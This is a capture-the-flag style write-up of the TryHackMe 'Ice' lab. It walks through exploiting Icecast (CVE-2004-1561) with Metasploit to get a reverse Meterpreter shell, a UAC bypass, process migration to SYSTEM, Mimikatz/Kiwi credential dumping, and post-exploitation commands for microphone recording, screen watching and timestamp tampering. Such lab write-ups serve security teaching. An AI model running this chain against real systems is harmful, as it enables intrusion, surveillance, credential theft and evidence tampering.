# Ice – TryHackMe Writeup

## Overview

This report documents the compromise of the **Ice** TryHackMe machine through exploitation of a vulnerable **Icecast** service, followed by privilege escalation via a UAC bypass technique, process migration to a SYSTEM-owned process, credential extraction using Mimikatz (Kiwi), and post-exploitation enumeration.

The objective was to identify the vulnerable service, gain initial access, escalate privileges to SYSTEM, extract credentials, and explore Windows post-exploitation techniques.

---

# Target Information

| Field     | Value         |
| --------- | ------------- |
| Target IP | 10.49.152.223 |
| Platform  | TryHackMe     |
| Room Name | Ice           |

---

# Executive Summary

During the assessment, a vulnerable Icecast streaming service was identified on port 8000.

The attack chain involved:

1. Enumerating exposed services.
2. Identifying Icecast on port 8000.
3. Discovering a known vulnerability (CVE-2004-1561).
4. Exploiting the service using Metasploit.
5. Obtaining a Meterpreter session.
6. Enumerating local privilege escalation opportunities.
7. Exploiting a UAC bypass vulnerability.
8. Migrating into a SYSTEM-owned process.
9. Extracting credentials using Mimikatz.
10. Exploring post-exploitation capabilities.

---

# Methodology

The assessment followed a standard penetration testing methodology:

* Reconnaissance
* Enumeration
* Vulnerability Analysis
* Exploitation
* Privilege Escalation
* Credential Access
* Post-Exploitation

---

# Phase 1 – Reconnaissance

## Host Discovery

### Command

```bash
ping 10.49.152.223
```

### Findings

The target responded to ICMP requests, confirming network connectivity.

### Observation

```text
TTL = 126
```

The TTL value suggested that the target was likely running a Windows operating system.

---

# Phase 2 – Network Enumeration

## Service Enumeration

### Command

```bash
nmap -sS -sV 10.49.152.223 -T4
```

### Results

| Port | State | Service | Version |
|------|--------|----------|---------|
| 135/tcp | Open | msrpc | Microsoft Windows RPC |
| 139/tcp | Open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | Open | microsoft-ds | Microsoft Windows 7 - 10 microsoft-ds (WORKGROUP) |
| 3389/tcp | Open | tcpwrapped | RDP Service Detected |
| 5357/tcp | Open | http | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |
| 8000/tcp | Open | http | Icecast Streaming Media Server |
| 49152/tcp | Open | msrpc | Microsoft Windows RPC |
| 49153/tcp | Open | msrpc | Microsoft Windows RPC |
| 49154/tcp | Open | msrpc | Microsoft Windows RPC |
| 49160/tcp | Open | msrpc | Microsoft Windows RPC |

### Analysis

The most interesting service was:

```text
8000/tcp open http Icecast streaming media server
```

Icecast is a streaming media server with known historical vulnerabilities.

---

# Phase 3 – Vulnerability Analysis

## Identifying Icecast Vulnerability

Research into the Icecast version revealed a publicly known vulnerability:

```text
CVE-2004-1561
```

### Description

The vulnerability allows a remote attacker to trigger a buffer overflow through crafted HTTP headers, resulting in remote code execution.

### Security Impact

Successful exploitation can provide remote access to the target system.

---

# Phase 4 – Exploitation

## Launching Metasploit

### Command

```bash
msfconsole
```

---

## Searching for an Exploit

### Command

```bash
search icecast
```

### Result

```text
exploit/windows/http/icecast_header
```

---

## Selecting the Exploit

### Command

```bash
use exploit/windows/http/icecast_header
```

### Observation

Metasploit automatically selected:

```text
windows/meterpreter/reverse_tcp
```

as the default payload.

---

## Configuring the Exploit

### Commands

```bash
set RHOSTS 10.49.152.223
set LHOST 192.168.130.28
```

---

## Executing the Exploit

### Command

```bash
run
```

### Result

```text
Meterpreter session 1 opened
```

### Verification

```bash
getuid
```

### Output

```text
Server username: Dark-PC\Dark
```

### Analysis

Initial access was obtained as the logged-in user:

```text
Dark
```

The compromise did not yet provide SYSTEM privileges.

---

# Phase 5 – Local Privilege Escalation Enumeration

## System Information

### Command

```bash
sysinfo
```

### Result

```text
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

---

## Running Local Exploit Suggester

### Command

```bash
run post/multi/recon/local_exploit_suggester
```

### Result

Several possible privilege escalation vectors were identified.

Notable findings included:

```text
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_comhijack
```

---

# Phase 6 – Privilege Escalation

## Selecting the UAC Bypass Module

### Command

```bash
use exploit/windows/local/bypassuac_eventvwr
```

---

## Configuring the Module

### Commands

```bash
set SESSION 1
set LHOST 192.168.130.28
```

---

## Executing the Exploit

### Command

```bash
run
```

### Result

```text
Meterpreter session 2 opened
```

### Analysis

The exploit abused the Event Viewer UAC bypass technique to elevate privileges and obtain a more privileged Meterpreter session.

---

## Verifying Privileges

### Command

```bash
getprivs
```

### Result

Several elevated privileges became available, including:

```text
SeDebugPrivilege
SeImpersonatePrivilege
SeBackupPrivilege
SeRestorePrivilege
```

These privileges indicated successful privilege escalation.

---

# Phase 7 – Process Migration

## Enumerating Running Processes

### Command

```bash
ps
```

### Observation

A SYSTEM-owned process was identified:

```text
PID 1260 - spoolsv.exe
```

### Verification

Current user context:

```bash
getuid
```

```text
Dark-PC\Dark
```

---

## Migrating to SYSTEM Process

### Command

```bash
migrate 1260
```

### Result

```text
Migration completed successfully
```

---

## Verification

### Command

```bash
getuid
```

### Output

```text
NT AUTHORITY\SYSTEM
```

### Why Migration Was Performed

Migration moves the Meterpreter session from the current process into another process (so we get SYSTEM access when we migrate to a process running as SYSTEM).

---

# Phase 8 – Credential Access

## Loading Kiwi (Mimikatz)

### Command

```bash
load kiwi
```

### Result

```text
Success.
```

### What is Kiwi?

Kiwi is the Meterpreter implementation of **Mimikatz**, a well-known post-exploitation tool used to extract credentials, hashes, Kerberos tickets, and other authentication data from Windows systems.

### Why Was Kiwi Loaded?

After obtaining SYSTEM privileges, Kiwi was loaded to access credential material stored in memory.

This allowed:

* Extraction of plaintext passwords
* Retrieval of NTLM password hashes
* Access to Kerberos credentials
* Collection of authentication tokens

Kiwi significantly expands Meterpreter's credential access capabilities and is commonly used during post-exploitation assessments to demonstrate the impact of a compromised system.

---

## Dumping Credentials

### Command

```bash
creds_all
```

### Result

```text
Dark : Password01!
```

### Additional Information

The command also revealed:

* NTLM hashes
* WDigest credentials
* TSPKG credentials
* Kerberos credentials

### Analysis

The credentials were successfully extracted from memory because the session was running under SYSTEM privileges.

---

# Phase 9 – Post-Exploitation Enumeration

## Password Hash Dumping

### Command

```bash
hashdump
```

### Purpose

Retrieves password hashes stored within the local SAM database.

---

## Monitoring User Activity

### Command

```bash
screenshare
```

### Purpose

Allows real-time viewing of the remote user's desktop.

---

## Recording Audio

### Command

```bash
record_mic
```

### Purpose

Captures audio from the system microphone.

---

## Modifying File Timestamps

### Command

```bash
timestomp
```

### Purpose

Modifies file timestamps to alter forensic evidence.

---

## Creating Golden Tickets

### Command

```bash
golden_ticket_create
```

### Purpose

Creates forged Kerberos Ticket Granting Tickets (TGTs) for persistence within Active Directory environments.

---

## Enabling Remote Desktop

### Command

```bash
run post/windows/manage/enable_rdp
```

### Purpose

Enables Remote Desktop Protocol (RDP) access to the compromised machine.

---

# Attack Chain

```text
Service Enumeration
        ↓
Icecast Service Discovered
        ↓
CVE-2004-1561 Identified
        ↓
Metasploit Icecast Exploit
        ↓
Meterpreter Session
        ↓
Local Exploit Suggester
        ↓
BypassUAC EventVwr
        ↓
Privileged Meterpreter Session
        ↓
Process Migration
        ↓
NT AUTHORITY\SYSTEM
        ↓
Kiwi (Mimikatz)
        ↓
Credential Extraction
        ↓
Post-Exploitation Activities
```

---

# Findings & Vulnerabilities

| ID   | Finding                          | Severity |
| ---- | -------------------------------- | -------- |
| F-01 | Vulnerable Icecast Service       | Critical |
| F-02 | Remote Code Execution Possible   | Critical |
| F-03 | UAC Bypass Vulnerability         | High     |
| F-04 | Credentials Stored in Memory     | High     |
| F-05 | SYSTEM-Level Compromise Achieved | Critical |

---

# Tools Used

### Enumeration

* Nmap

### Exploitation

* Metasploit Framework
* Icecast Header Exploit

### Privilege Escalation

* Local Exploit Suggester
* bypassuac_eventvwr

### Credential Access

* Kiwi (Mimikatz)
* Hashdump

### Post-Exploitation

* Meterpreter
* Screenshare
* Record Mic
* Timestomp

---

# Credentials Obtained

| User | Password    |
| ---- | ----------- |
| Dark | Password01! |

---

# Conclusion

The compromise of the Ice machine was achieved through exploitation of a vulnerable Icecast streaming server affected by CVE-2004-1561. Successful exploitation provided a Meterpreter session as a low-privileged user.

Further enumeration identified a viable UAC bypass technique that enabled privilege escalation. The session was migrated into a SYSTEM-owned process to gain maximum privileges and improve session stability. Using Kiwi (Mimikatz), credentials were extracted from memory, demonstrating the risks associated with credential exposure on compromised systems.

This assessment highlights the importance of patch management, restricting legacy vulnerable software, enforcing least privilege, and protecting sensitive credentials from memory-based attacks.
